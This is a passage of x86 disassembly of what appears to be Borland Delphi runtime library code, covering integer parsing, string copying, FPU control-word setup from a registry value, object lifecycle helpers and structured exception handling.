  4029e4:	77 21                	ja     0x402a07
  4029e6:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4029e9:	01 c0                	add    %eax,%eax
  4029eb:	01 d8                	add    %ebx,%eax
  4029ed:	8a 1e                	mov    (%esi),%bl
  4029ef:	46                   	inc    %esi
  4029f0:	84 db                	test   %bl,%bl
  4029f2:	75 e6                	jne    0x4029da
  4029f4:	fe cd                	dec    %ch
  4029f6:	74 09                	je     0x402a01
  4029f8:	85 c0                	test   %eax,%eax
  4029fa:	7d 54                	jge    0x402a50
  4029fc:	eb 09                	jmp    0x402a07
  4029fe:	46                   	inc    %esi
  4029ff:	eb 06                	jmp    0x402a07
  402a01:	f7 d8                	neg    %eax
  402a03:	7e 4b                	jle    0x402a50
  402a05:	78 49                	js     0x402a50
  402a07:	5b                   	pop    %ebx
  402a08:	29 de                	sub    %ebx,%esi
  402a0a:	eb 47                	jmp    0x402a53
  402a0c:	fe c5                	inc    %ch
  402a0e:	8a 1e                	mov    (%esi),%bl
  402a10:	46                   	inc    %esi
  402a11:	eb 9c                	jmp    0x4029af
  402a13:	bf ff ff ff 0f       	mov    $0xfffffff,%edi
  402a18:	8a 1e                	mov    (%esi),%bl
  402a1a:	46                   	inc    %esi
  402a1b:	84 db                	test   %bl,%bl
  402a1d:	74 df                	je     0x4029fe
  402a1f:	80 fb 61             	cmp    $0x61,%bl
  402a22:	72 03                	jb     0x402a27
  402a24:	80 eb 20             	sub    $0x20,%bl
  402a27:	80 eb 30             	sub    $0x30,%bl
  402a2a:	80 fb 09             	cmp    $0x9,%bl
  402a2d:	76 0b                	jbe    0x402a3a
  402a2f:	80 eb 11             	sub    $0x11,%bl
  402a32:	80 fb 05             	cmp    $0x5,%bl
  402a35:	77 d0                	ja     0x402a07
  402a37:	80 c3 0a             	add    $0xa,%bl
  402a3a:	39 f8                	cmp    %edi,%eax
  402a3c:	77 c9                	ja     0x402a07
  402a3e:	c1 e0 04             	shl    $0x4,%eax
  402a41:	01 d8                	add    %ebx,%eax
  402a43:	8a 1e                	mov    (%esi),%bl
  402a45:	46                   	inc    %esi
  402a46:	84 db                	test   %bl,%bl
  402a48:	75 d5                	jne    0x402a1f
  402a4a:	fe cd                	dec    %ch
  402a4c:	75 02                	jne    0x402a50
  402a4e:	f7 d8                	neg    %eax
  402a50:	59                   	pop    %ecx
  402a51:	31 f6                	xor    %esi,%esi
  402a53:	89 32                	mov    %esi,(%edx)
  402a55:	5f                   	pop    %edi
  402a56:	5e                   	pop    %esi
  402a57:	5b                   	pop    %ebx
  402a58:	c3                   	ret
  402a59:	8d 40 00             	lea    0x0(%eax),%eax
  402a5c:	b9 ff 00 00 00       	mov    $0xff,%ecx
  402a61:	e8 02 00 00 00       	call   0x402a68
  402a66:	c3                   	ret
  402a67:	90                   	nop
  402a68:	53                   	push   %ebx
  402a69:	50                   	push   %eax
  402a6a:	81 f9 ff 00 00 00    	cmp    $0xff,%ecx
  402a70:	76 05                	jbe    0x402a77
  402a72:	b9 ff 00 00 00       	mov    $0xff,%ecx
  402a77:	8a 1a                	mov    (%edx),%bl
  402a79:	42                   	inc    %edx
  402a7a:	84 db                	test   %bl,%bl
  402a7c:	74 06                	je     0x402a84
  402a7e:	40                   	inc    %eax
  402a7f:	88 18                	mov    %bl,(%eax)
  402a81:	49                   	dec    %ecx
  402a82:	75 f3                	jne    0x402a77
  402a84:	5a                   	pop    %edx
  402a85:	29 d0                	sub    %edx,%eax
  402a87:	88 02                	mov    %al,(%edx)
  402a89:	5b                   	pop    %ebx
  402a8a:	c3                   	ret
  402a8b:	90                   	nop
  402a8c:	ff 25 48 d1 41 00    	jmp    *0x41d148
  402a92:	8b c0                	mov    %eax,%eax
  402a94:	53                   	push   %ebx
  402a95:	33 db                	xor    %ebx,%ebx
  402a97:	6a 00                	push   $0x0
  402a99:	e8 ee ff ff ff       	call   0x402a8c
  402a9e:	83 f8 07             	cmp    $0x7,%eax
  402aa1:	75 1c                	jne    0x402abf
  402aa3:	6a 01                	push   $0x1
  402aa5:	e8 e2 ff ff ff       	call   0x402a8c
  402aaa:	25 00 ff 00 00       	and    $0xff00,%eax
  402aaf:	3d 00 0d 00 00       	cmp    $0xd00,%eax
  402ab4:	74 07                	je     0x402abd
  402ab6:	3d 00 04 00 00       	cmp    $0x400,%eax
  402abb:	75 02                	jne    0x402abf
  402abd:	b3 01                	mov    $0x1,%bl
  402abf:	8b c3                	mov    %ebx,%eax
  402ac1:	5b                   	pop    %ebx
  402ac2:	c3                   	ret
  402ac3:	90                   	nop
  402ac4:	55                   	push   %ebp
  402ac5:	8b ec                	mov    %esp,%ebp
  402ac7:	83 c4 f4             	add    $0xfffffff4,%esp
  402aca:	0f b7 05 18 b0 41 00 	movzwl 0x41b018,%eax
  402ad1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402ad4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402ad7:	50                   	push   %eax
  402ad8:	6a 01                	push   $0x1
  402ada:	6a 00                	push   $0x0
  402adc:	68 5c 2b 40 00       	push   $0x402b5c
  402ae1:	68 02 00 00 80       	push   $0x80000002
  402ae6:	e8 45 e6 ff ff       	call   0x401130
  402aeb:	85 c0                	test   %eax,%eax
  402aed:	75 4d                	jne    0x402b3c
  402aef:	33 c0                	xor    %eax,%eax
  402af1:	55                   	push   %ebp
  402af2:	68 35 2b 40 00       	push   $0x402b35
  402af7:	64 ff 30             	push   %fs:(%eax)
  402afa:	64 89 20             	mov    %esp,%fs:(%eax)
  402afd:	c7 45 f4 04 00 00 00 	movl   $0x4,-0xc(%ebp)
  402b04:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402b07:	50                   	push   %eax
  402b08:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402b0b:	50                   	push   %eax
  402b0c:	6a 00                	push   $0x0
  402b0e:	6a 00                	push   $0x0
  402b10:	68 78 2b 40 00       	push   $0x402b78
  402b15:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402b18:	50                   	push   %eax
  402b19:	e8 1a e6 ff ff       	call   0x401138
  402b1e:	33 c0                	xor    %eax,%eax
  402b20:	5a                   	pop    %edx
  402b21:	59                   	pop    %ecx
  402b22:	59                   	pop    %ecx
  402b23:	64 89 10             	mov    %edx,%fs:(%eax)
  402b26:	68 3c 2b 40 00       	push   $0x402b3c
  402b2b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402b2e:	50                   	push   %eax
  402b2f:	e8 f4 e5 ff ff       	call   0x401128
  402b34:	c3                   	ret
  402b35:	e9 46 04 00 00       	jmp    0x402f80
  402b3a:	eb ef                	jmp    0x402b2b
  402b3c:	66 a1 18 b0 41 00    	mov    0x41b018,%ax
  402b42:	66 25 c0 ff          	and    $0xffc0,%ax
  402b46:	66 8b 55 f8          	mov    -0x8(%ebp),%dx
  402b4a:	66 83 e2 3f          	and    $0x3f,%dx
  402b4e:	66 0b c2             	or     %dx,%ax
  402b51:	66 a3 18 b0 41 00    	mov    %ax,0x41b018
  402b57:	8b e5                	mov    %ebp,%esp
  402b59:	5d                   	pop    %ebp
  402b5a:	c3                   	ret
  402b5b:	00 53 4f             	add    %dl,0x4f(%ebx)
  402b5e:	46                   	inc    %esi
  402b5f:	54                   	push   %esp
  402b60:	57                   	push   %edi
  402b61:	41                   	inc    %ecx
  402b62:	52                   	push   %edx
  402b63:	45                   	inc    %ebp
  402b64:	5c                   	pop    %esp
  402b65:	42                   	inc    %edx
  402b66:	6f                   	outsl  %ds:(%esi),(%dx)
  402b67:	72 6c                	jb     0x402bd5
  402b69:	61                   	popa
  402b6a:	6e                   	outsb  %ds:(%esi),(%dx)
  402b6b:	64 5c                	fs pop %esp
  402b6d:	44                   	inc    %esp
  402b6e:	65 6c                	gs insb (%dx),%es:(%edi)
  402b70:	70 68                	jo     0x402bda
  402b72:	69 5c 52 54 4c 00 46 	imul   $0x5046004c,0x54(%edx,%edx,2),%ebx
  402b79:	50 
  402b7a:	55                   	push   %ebp
  402b7b:	4d                   	dec    %ebp
  402b7c:	61                   	popa
  402b7d:	73 6b                	jae    0x402bea
  402b7f:	56                   	push   %esi
  402b80:	61                   	popa
  402b81:	6c                   	insb   (%dx),%es:(%edi)
  402b82:	75 65                	jne    0x402be9
  402b84:	00 00                	add    %al,(%eax)
  402b86:	00 00                	add    %al,(%eax)
  402b88:	db e3                	fninit
  402b8a:	9b d9 2d 18 b0 41 00 	fldcw  0x41b018
  402b91:	c3                   	ret
  402b92:	8b c0                	mov    %eax,%eax
  402b94:	53                   	push   %ebx
  402b95:	8b d8                	mov    %eax,%ebx
  402b97:	8b c3                	mov    %ebx,%eax
  402b99:	e8 26 00 00 00       	call   0x402bc4
  402b9e:	e8 8d f9 ff ff       	call   0x402530
  402ba3:	8b d0                	mov    %eax,%edx
  402ba5:	8b c3                	mov    %ebx,%eax
  402ba7:	e8 5c 00 00 00       	call   0x402c08
  402bac:	5b                   	pop    %ebx
  402bad:	c3                   	ret
  402bae:	8b c0                	mov    %eax,%eax
  402bb0:	53                   	push   %ebx
  402bb1:	8b d8                	mov    %eax,%ebx
  402bb3:	8b c3                	mov    %ebx,%eax
  402bb5:	e8 a6 00 00 00       	call   0x402c60
  402bba:	8b c3                	mov    %ebx,%eax
  402bbc:	e8 8f f9 ff ff       	call   0x402550
  402bc1:	5b                   	pop    %ebx
  402bc2:	c3                   	ret
  402bc3:	90                   	nop
  402bc4:	83 c0 d8             	add    $0xffffffd8,%eax
  402bc7:	8b 00                	mov    (%eax),%eax
  402bc9:	c3                   	ret
  402bca:	8b c0                	mov    %eax,%eax
  402bcc:	84 d2                	test   %dl,%dl
  402bce:	74 08                	je     0x402bd8
  402bd0:	83 c4 f0             	add    $0xfffffff0,%esp
  402bd3:	e8 14 01 00 00       	call   0x402cec
  402bd8:	84 d2                	test   %dl,%dl
  402bda:	74 0f                	je     0x402beb
  402bdc:	e8 63 01 00 00       	call   0x402d44
  402be1:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  402be8:	83 c4 0c             	add    $0xc,%esp
  402beb:	c3                   	ret
  402bec:	e8 63 01 00 00       	call   0x402d54
  402bf1:	84 d2                	test   %dl,%dl
  402bf3:	7e 05                	jle    0x402bfa
  402bf5:	e8 42 01 00 00       	call   0x402d3c
  402bfa:	c3                   	ret
  402bfb:	90                   	nop
  402bfc:	85 c0                	test   %eax,%eax
  402bfe:	74 07                	je     0x402c07
  402c00:	b2 01                	mov    $0x1,%dl
  402c02:	8b 08                	mov    (%eax),%ecx
  402c04:	ff 51 fc             	call   *-0x4(%ecx)
  402c07:	c3                   	ret
  402c08:	53                   	push   %ebx
  402c09:	56                   	push   %esi
  402c0a:	57                   	push   %edi
  402c0b:	89 c3                	mov    %eax,%ebx
  402c0d:	89 d7                	mov    %edx,%edi
  402c0f:	ab                   	stos   %eax,%es:(%edi)
  402c10:	8b 4b d8             	mov    -0x28(%ebx),%ecx
  402c13:	31 c0                	xor    %eax,%eax
  402c15:	51                   	push   %ecx
  402c16:	c1 e9 02             	shr    $0x2,%ecx
  402c19:	49                   	dec    %ecx
  402c1a:	f3 ab                	rep stos %eax,%es:(%edi)
  402c1c:	59                   	pop    %ecx
  402c1d:	83 e1 03             	and    $0x3,%ecx
  402c20:	f3 aa                	rep stos %al,%es:(%edi)
  402c22:	89 d0                	mov    %edx,%eax
  402c24:	89 e2                	mov    %esp,%edx
  402c26:	8b 4b b8             	mov    -0x48(%ebx),%ecx
  402c29:	85 c9                	test   %ecx,%ecx
  402c2b:	74 01                	je     0x402c2e
  402c2d:	51                   	push   %ecx
  402c2e:	8b 5b dc             	mov    -0x24(%ebx),%ebx
  402c31:	85 db                	test   %ebx,%ebx
  402c33:	74 04                	je     0x402c39
  402c35:	8b 1b                	mov    (%ebx),%ebx
  402c37:	eb ed                	jmp    0x402c26
  402c39:	39 d4                	cmp    %edx,%esp
  402c3b:	74 1d                	je     0x402c5a
  402c3d:	5b                   	pop    %ebx
  402c3e:	8b 0b                	mov    (%ebx),%ecx
  402c40:	83 c3 04             	add    $0x4,%ebx
  402c43:	8b 73 10             	mov    0x10(%ebx),%esi
  402c46:	85 f6                	test   %esi,%esi
  402c48:	74 06                	je     0x402c50
  402c4a:	8b 7b 14             	mov    0x14(%ebx),%edi
  402c4d:	89 34 07             	mov    %esi,(%edi,%eax,1)
  402c50:	83 c3 1c             	add    $0x1c,%ebx
  402c53:	49                   	dec    %ecx
  402c54:	75 ed                	jne    0x402c43
  402c56:	39 d4                	cmp    %edx,%esp
  402c58:	75 e3                	jne    0x402c3d
  402c5a:	5f                   	pop    %edi
  402c5b:	5e                   	pop    %esi
  402c5c:	5b                   	pop    %ebx
  402c5d:	c3                   	ret
  402c5e:	8b c0                	mov    %eax,%eax
  402c60:	53                   	push   %ebx
  402c61:	56                   	push   %esi
  402c62:	89 c3                	mov    %eax,%ebx
  402c64:	89 c6                	mov    %eax,%esi
  402c66:	8b 36                	mov    (%esi),%esi
  402c68:	8b 56 c0             	mov    -0x40(%esi),%edx
  402c6b:	8b 76 dc             	mov    -0x24(%esi),%esi
  402c6e:	85 d2                	test   %edx,%edx
  402c70:	74 07                	je     0x402c79
  402c72:	e8 61 15 00 00       	call   0x4041d8
  402c77:	89 d8                	mov    %ebx,%eax
  402c79:	85 f6                	test   %esi,%esi
  402c7b:	75 e9                	jne    0x402c66
  402c7d:	5e                   	pop    %esi
  402c7e:	5b                   	pop    %ebx
  402c7f:	c3                   	ret
  402c80:	57                   	push   %edi
  402c81:	96                   	xchg   %eax,%esi
  402c82:	eb 02                	jmp    0x402c86
  402c84:	8b 36                	mov    (%esi),%esi
  402c86:	8b 7e d0             	mov    -0x30(%esi),%edi
  402c89:	85 ff                	test   %edi,%edi
  402c8b:	74 0d                	je     0x402c9a
  402c8d:	0f b7 0f             	movzwl (%edi),%ecx
  402c90:	51                   	push   %ecx
  402c91:	83 c7 02             	add    $0x2,%edi
  402c94:	f2 66 af             	repnz scas %es:(%edi),%ax
  402c97:	74 0a                	je     0x402ca3
  402c99:	59                   	pop    %ecx
  402c9a:	8b 76 dc             	mov    -0x24(%esi),%esi
  402c9d:	85 f6                	test   %esi,%esi
  402c9f:	75 e3                	jne    0x402c84
  402ca1:	5f                   	pop    %edi
  402ca2:	c3                   	ret
  402ca3:	58                   	pop    %eax
  402ca4:	01 c0                	add    %eax,%eax
  402ca6:	29 c8                	sub    %ecx,%eax
  402ca8:	8b 74 47 fc          	mov    -0x4(%edi,%eax,2),%esi
  402cac:	5f                   	pop    %edi
  402cad:	c3                   	ret
  402cae:	8b c0                	mov    %eax,%eax
  402cb0:	b8 ff ff 00 80       	mov    $0x8000ffff,%eax
  402cb5:	c3                   	ret
  402cb6:	8b c0                	mov    %eax,%eax
  402cb8:	c3                   	ret
  402cb9:	8d 40 00             	lea    0x0(%eax),%eax
  402cbc:	c3                   	ret
  402cbd:	8d 40 00             	lea    0x0(%eax),%eax
  402cc0:	c3                   	ret
  402cc1:	8d 40 00             	lea    0x0(%eax),%eax
  402cc4:	56                   	push   %esi
  402cc5:	66 8b 32             	mov    (%edx),%si
  402cc8:	66 09 f6             	or     %si,%si
  402ccb:	74 17                	je     0x402ce4
  402ccd:	66 81 fe 00 c0       	cmp    $0xc000,%si
  402cd2:	73 10                	jae    0x402ce4
  402cd4:	50                   	push   %eax
  402cd5:	8b 00                	mov    (%eax),%eax
  402cd7:	e8 a4 ff ff ff       	call   0x402c80
  402cdc:	58                   	pop    %eax
  402cdd:	74 05                	je     0x402ce4
  402cdf:	89 f1                	mov    %esi,%ecx
  402ce1:	5e                   	pop    %esi
  402ce2:	ff e1                	jmp    *%ecx
  402ce4:	5e                   	pop    %esi
  402ce5:	8b 08                	mov    (%eax),%ecx
  402ce7:	ff 61 f0             	jmp    *-0x10(%ecx)
  402cea:	c3                   	ret
  402ceb:	90                   	nop
  402cec:	52                   	push   %edx
  402ced:	51                   	push   %ecx
  402cee:	53                   	push   %ebx
  402cef:	84 d2                	test   %dl,%dl
  402cf1:	7c 03                	jl     0x402cf6
  402cf3:	ff 50 f4             	call   *-0xc(%eax)
  402cf6:	31 d2                	xor    %edx,%edx
  402cf8:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402cfc:	64 8b 1a             	mov    %fs:(%edx),%ebx
  402cff:	89 19                	mov    %ebx,(%ecx)
  402d01:	89 69 08             	mov    %ebp,0x8(%ecx)
  402d04:	c7 41 04 15 2d 40 00 	movl   $0x402d15,0x4(%ecx)
  402d0b:	89 41 0c             	mov    %eax,0xc(%ecx)
  402d0e:	64 89 0a             	mov    %ecx,%fs:(%edx)
  402d11:	5b                   	pop    %ebx
  402d12:	59                   	pop    %ecx
  402d13:	5a                   	pop    %edx
  402d14:	c3                   	ret
  402d15:	e9 3a 01 00 00       	jmp    0x402e54
  402d1a:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402d1e:	8b 40 0c             	mov    0xc(%eax),%eax
  402d21:	85 c0                	test   %eax,%eax
  402d23:	74 0e                	je     0x402d33
  402d25:	8b 08                	mov    (%eax),%ecx
  402d27:	b2 81                	mov    $0x81,%dl
  402d29:	50                   	push   %eax
  402d2a:	ff 51 fc             	call   *-0x4(%ecx)
  402d2d:	58                   	pop    %eax
  402d2e:	e8 09 00 00 00       	call   0x402d3c
  402d33:	e8 80 02 00 00       	call   0x402fb8
  402d38:	c3                   	ret
  402d39:	8d 40 00             	lea    0x0(%eax),%eax
  402d3c:	8b 10                	mov    (%eax),%edx
  402d3e:	ff 52 f8             	call   *-0x8(%edx)
  402d41:	c3                   	ret
  402d42:	8b c0                	mov    %eax,%eax
  402d44:	53                   	push   %ebx
  402d45:	8b d8                	mov    %eax,%ebx
  402d47:	8b c3                	mov    %ebx,%eax
  402d49:	8b 10                	mov    (%eax),%edx
  402d4b:	ff 52 e4             	call   *-0x1c(%edx)
  402d4e:	8b c3                	mov    %ebx,%eax
  402d50:	5b                   	pop    %ebx
  402d51:	c3                   	ret
  402d52:	8b c0                	mov    %eax,%eax
  402d54:	84 d2                	test   %dl,%dl
  402d56:	7f 01                	jg     0x402d59
  402d58:	c3                   	ret
  402d59:	50                   	push   %eax
  402d5a:	52                   	push   %edx
  402d5b:	8b 10                	mov    (%eax),%edx
  402d5d:	ff 52 e8             	call   *-0x18(%edx)
  402d60:	5a                   	pop    %edx
  402d61:	58                   	pop    %eax
  402d62:	c3                   	ret
  402d63:	90                   	nop
  402d64:	80 3d 1c b0 41 00 01 	cmpb   $0x1,0x41b01c
  402d6b:	76 11                	jbe    0x402d7e
  402d6d:	6a 00                	push   $0x0
  402d6f:	6a 00                	push   $0x0
  402d71:	6a 00                	push   $0x0
  402d73:	68 df fa ed 0e       	push   $0xeedfadf
  402d78:	ff 15 10 c0 41 00    	call   *0x41c010
  402d7e:	c3                   	ret
  402d7f:	90                   	nop
  402d80:	80 3d 1c b0 41 00 00 	cmpb   $0x0,0x41b01c
  402d87:	74 17                	je     0x402da0
  402d89:	50                   	push   %eax
  402d8a:	50                   	push   %eax
  402d8b:	52                   	push   %edx
  402d8c:	54                   	push   %esp
  402d8d:	6a 02                	push   $0x2
  402d8f:	6a 00                	push   $0x0
  402d91:	68 e4 fa ed 0e       	push   $0xeedfae4
  402d96:	ff 15 10 c0 41 00    	call   *0x41c010
  402d9c:	83 c4 08             	add    $0x8,%esp
  402d9f:	58                   	pop    %eax
  402da0:	c3                   	ret
  402da1:	8d 40 00             	lea    0x0(%eax),%eax
  402da4:	54                   	push   %esp
  402da5:	6a 01                	push   $0x1
  402da7:	6a 00                	push   $0x0
  402da9:	68 e0 fa ed 0e       	push   $0xeedfae0
  402dae:	ff 15 10 c0 41 00    	call   *0x41c010
  402db4:	83 c4 04             	add    $0x4,%esp
  402db7:	58                   	pop    %eax
  402db8:	c3                   	ret
  402db9:	8d 40 00             	lea    0x0(%eax),%eax
  402dbc:	80 3d 1c b0 41 00 01 	cmpb   $0x1,0x41b01c
  402dc3:	76 07                	jbe    0x402dcc
  402dc5:	50                   	push   %eax
  402dc6:	53                   	push   %ebx
  402dc7:	e9 d8 ff ff ff       	jmp    0x402da4
  402dcc:	c3                   	ret
  402dcd:	8d 40 00             	lea    0x0(%eax),%eax
  402dd0:	85 c9                	test   %ecx,%ecx
  402dd2:	74 19                	je     0x402ded
  402dd4:	8b 41 01             	mov    0x1(%ecx),%eax
  402dd7:	80 39 e9             	cmpb   $0xe9,(%ecx)
  402dda:	74 0c                	je     0x402de8
  402ddc:	80 39 eb             	cmpb   $0xeb,(%ecx)
  402ddf:	75 0c                	jne    0x402ded
  402de1:	0f be c0             	movsbl %al,%eax
  402de4:	41                   	inc    %ecx
  402de5:	41                   	inc    %ecx
  402de6:	eb 03                	jmp    0x402deb
  402de8:	83 c1 05             	add    $0x5,%ecx
  402deb:	01 c1                	add    %eax,%ecx
  402ded:	c3                   	ret
  402dee:	8b c0                	mov    %eax,%eax
  402df0:	80 3d 1c b0 41 00 01 	cmpb   $0x1,0x41b01c
  402df7:	76 1d                	jbe    0x402e16
  402df9:	50                   	push   %eax
  402dfa:	52                   	push   %edx
  402dfb:	51                   	push   %ecx
  402dfc:	e8 cf ff ff ff       	call   0x402dd0
  402e01:	51                   	push   %ecx
  402e02:	54                   	push   %esp
  402e03:	6a 01                	push   $0x1
  402e05:	6a 00                	push   $0x0
  402e07:	68 e1 fa ed 0e       	push   $0xeedfae1
  402e0c:	ff 15 10 c0 41 00    	call   *0x41c010
  402e12:	59                   	pop    %ecx
  402e13:	59                   	pop    %ecx
  402e14:	5a                   	pop    %edx
  402e15:	58                   	pop    %eax
  402e16:	c3                   	ret
  402e17:	90                   	nop
  402e18:	80 3d 1c b0 41 00 01 	cmpb   $0x1,0x41b01c
  402e1f:	76 12                	jbe    0x402e33
  402e21:	52                   	push   %edx
  402e22:	54                   	push   %esp
  402e23:	6a 01                	push   $0x1
  402e25:	6a 00                	push   $0x0
  402e27:	68 e2 fa ed 0e       	push   $0xeedfae2
  402e2c:	ff 15 10 c0 41 00    	call   *0x41c010
  402e32:	5a                   	pop    %edx
  402e33:	c3                   	ret
  402e34:	50                   	push   %eax
  402e35:	52                   	push   %edx
  402e36:	80 3d 1c b0 41 00 01 	cmpb   $0x1,0x41b01c
  402e3d:	76 10                	jbe    0x402e4f
  402e3f:	54                   	push   %esp
  402e40:	6a 02                	push   $0x2
  402e42:	6a 00                	push   $0x0
  402e44:	68 e3 fa ed 0e       	push   $0xeedfae3
  402e49:	ff 15 10 c0 41 00    	call   *0x41c010
  402e4f:	5a                   	pop    %edx
  402e50:	58                   	pop    %eax
  402e51:	c3                   	ret
  402e52:	8b c0                	mov    %eax,%eax
  402e54:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e58:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402e5f:	0f 85 13 01 00 00    	jne    0x402f78
  402e65:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  402e6b:	8b 50 18             	mov    0x18(%eax),%edx
  402e6e:	8b 48 14             	mov    0x14(%eax),%ecx
  402e71:	74 6e                	je     0x402ee1
  402e73:	fc                   	cld
  402e74:	e8 0f fd ff ff       	call   0x402b88
  402e79:	8b 15 0c c0 41 00    	mov    0x41c00c,%edx
  402e7f:	85 d2                	test   %edx,%edx
  402e81:	0f 84 f1 00 00 00    	je     0x402f78
  402e87:	ff d2                	call   *%edx
  402e89:	85 c0                	test   %eax,%eax
  402e8b:	0f 84 e7 00 00 00    	je     0x402f78
  402e91:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402e95:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402e99:	81 39 ce fa ef 0e    	cmpl   $0xeefface,(%ecx)
  402e9f:	74 37                	je     0x402ed8
  402ea1:	e8 da fe ff ff       	call   0x402d80
  402ea6:	80 3d 20 b0 41 00 00 	cmpb   $0x0,0x41b020
  402ead:	76 29                	jbe    0x402ed8
  402eaf:	80 3d 1c b0 41 00 00 	cmpb   $0x0,0x41b01c
  402eb6:	77 20                	ja     0x402ed8
  402eb8:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402ebc:	50                   	push   %eax
  402ebd:	51                   	push   %ecx
  402ebe:	e8 05 e2 ff ff       	call   0x4010c8
  402ec3:	83 f8 00             	cmp    $0x0,%eax
  402ec6:	58                   	pop    %eax
  402ec7:	0f 84 ab 00 00 00    	je     0x402f78
  402ecd:	89 c2                	mov    %eax,%edx
  402ecf:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ed3:	8b 48 0c             	mov    0xc(%eax),%ecx
  402ed6:	eb 30                	jmp    0x402f08
  402ed8:	89 c2                	mov    %eax,%edx
  402eda:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ede:	8b 48 0c             	mov    0xc(%eax),%ecx
  402ee1:	80 3d 20 b0 41 00 01 	cmpb   $0x1,0x41b020
  402ee8:	76 1e                	jbe    0x402f08
  402eea:	80 3d 1c b0 41 00 00 	cmpb   $0x0,0x41b01c
  402ef1:	77 15                	ja     0x402f08
  402ef3:	50                   	push   %eax
  402ef4:	8d 44 24 08          	lea    0x8(%esp),%eax
  402ef8:	52                   	push   %edx
  402ef9:	51                   	push   %ecx
  402efa:	50                   	push   %eax
  402efb:	e8 c8 e1 ff ff       	call   0x4010c8
  402f00:	83 f8 00             	cmp    $0x0,%eax
  402f03:	59                   	pop    %ecx
  402f04:	5a                   	pop    %edx
  402f05:	58                   	pop    %eax
  402f06:	74 70                	je     0x402f78
  402f08:	83 48 04 02          	orl    $0x2,0x4(%eax)
  402f0c:	53                   	push   %ebx
  402f0d:	31 db                	xor    %ebx,%ebx
  402f0f:	56                   	push   %esi
  402f10:	57                   	push   %edi
  402f11:	55                   	push   %ebp
  402f12:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  402f15:	53                   	push   %ebx
  402f16:	50                   	push   %eax
  402f17:	52                   	push   %edx
  402f18:	51                   	push   %ecx
  402f19:	8b 54 24 28          	mov    0x28(%esp),%edx
  402f1d:	6a 00                	push   $0x0
  402f1f:	50                   	push   %eax
  402f20:	68 2c 2f 40 00       	push   $0x402f2c
  402f25:	52                   	push   %edx
  402f26:	ff 15 14 c0 41 00    	call   *0x41c014
  402f2c:	8b 7c 24 28          	mov    0x28(%esp),%edi
  402f30:	e8 bb 1d 00 00       	call   0x404cf0
  402f35:	ff b0 20 c6 41 00    	push   0x41c620(%eax)
  402f3b:	89 a0 20 c6 41 00    	mov    %esp,0x41c620(%eax)
  402f41:	8b 6f 08             	mov    0x8(%edi),%ebp
  402f44:	8b 5f 04             	mov    0x4(%edi),%ebx
  402f47:	c7 47 04 58 2f 40 00 	movl   $0x402f58,0x4(%edi)
  402f4e:	83 c3 05             	add    $0x5,%ebx
  402f51:	e8 66 fe ff ff       	call   0x402dbc
  402f56:	ff e3                	jmp    *%ebx
  402f58:	e9 23 00 00 00       	jmp    0x402f80
  402f5d:	e8 8e 1d 00 00       	call   0x404cf0
  402f62:	8b 88 20 c6 41 00    	mov    0x41c620(%eax),%ecx
  402f68:	8b 11                	mov    (%ecx),%edx
  402f6a:	89 90 20 c6 41 00    	mov    %edx,0x41c620(%eax)
  402f70:	8b 41 08             	mov    0x8(%ecx),%eax
  402f73:	e9 84 fc ff ff       	jmp    0x402bfc
  402f78:	b8 01 00 00 00       	mov    $0x1,%eax
  402f7d:	c3                   	ret
  402f7e:	8b c0                	mov    %eax,%eax
  402f80:	8b 44 24 04          	mov    0x4(%esp),%eax
  402f84:	8b 54 24 08          	mov    0x8(%esp),%edx
  402f88:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402f8f:	74 1f                	je     0x402fb0
  402f91:	8b 4a 04             	mov    0x4(%edx),%ecx
  402f94:	c7 42 04 b0 2f 40 00 	movl   $0x402fb0,0x4(%edx)
  402f9b:	53                   	push   %ebx
  402f9c:	56                   	push   %esi
  402f9d:	57                   	push   %edi
  402f9e:	55                   	push   %ebp
  402f9f:	8b 6a 08             	mov    0x8(%edx),%ebp
  402fa2:	83 c1 05             	add    $0x5,%ecx
  402fa5:	e8 46 fe ff ff       	call   0x402df0
  402faa:	ff d1                	call   *%ecx
  402fac:	5d                   	pop    %ebp
  402fad:	5f                   	pop    %edi
  402fae:	5e                   	pop    %esi
  402faf:	5b                   	pop    %ebx
  402fb0:	b8 01 00 00 00       	mov    $0x1,%eax
  402fb5:	c3                   	ret
  402fb6:	8b c0                	mov    %eax,%eax
  402fb8:	8b 44 24 30          	mov    0x30(%esp),%eax
  402fbc:	c7 40 04 03 30 40 00 	movl   $0x403003,0x4(%eax)
  402fc3:	e8 28 1d 00 00       	call   0x404cf0
  402fc8:	8b 90 20 c6 41 00    	mov    0x41c620(%eax),%edx
  402fce:	8b 0a                	mov    (%edx),%ecx
  402fd0:	89 88 20 c6 41 00    	mov    %ecx,0x41c620(%eax)
  402fd6:	8b 42 0c             	mov    0xc(%edx),%eax
  402fd9:	83 60 04 fd          	andl   $0xfffffffd,0x4(%eax)
  402fdd:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  402fe3:	74 0d                	je     0x402ff2
  402fe5:	8b 42 08             	mov    0x8(%edx),%eax
  402fe8:	e8 0f fc ff ff       	call   0x402bfc
  402fed:	e8 72 fd ff ff       	call   0x402d64
  402ff2:	31 c0                	xor    %eax,%eax
  402ff4:	83 c4 14             	add    $0x14,%esp
  402ff7:	64 8b 10             	mov    %fs:(%eax),%edx
  402ffa:	59                   	pop    %ecx
  402ffb:	8b 12                	mov    (%edx),%edx
  402ffd:	89 11                	mov    %edx,(%ecx)
  402fff:	5d                   	pop    %ebp
  403000:	5f                   	pop    %edi
  403001:	5e                   	pop    %esi
  403002:	5b                   	pop    %ebx
